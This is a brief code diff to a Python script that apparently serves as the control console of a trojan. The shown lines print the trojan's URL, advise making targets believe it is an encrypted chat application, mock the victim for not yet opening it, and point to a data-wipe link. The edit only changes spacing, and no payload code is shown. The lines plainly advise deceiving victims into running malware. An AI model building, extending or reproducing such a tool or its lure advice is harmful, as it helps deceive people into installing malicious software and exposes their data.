@@ -58,7 +58,7 @@ while True:
 
                       """)
                 print(f"                                         {BLUE}The Trojans url:  {RESET}" + ar_link + f"\n                                         {BLUE}Best way is to make them think it's a encrypted chatting application. {RESET}")
-                print(f"                                         {RED}Dumbass has yet to open the trojan, waiting...\n To wipe data, go to{RESET}" + delete_data)
+                print(f"                                         {RED}Dumbass has yet to open the trojan, waiting...\n                                          To wipe data, go to{RESET}" + delete_data)
                 
         else:
             print(f"Received status code {response.status_code}")
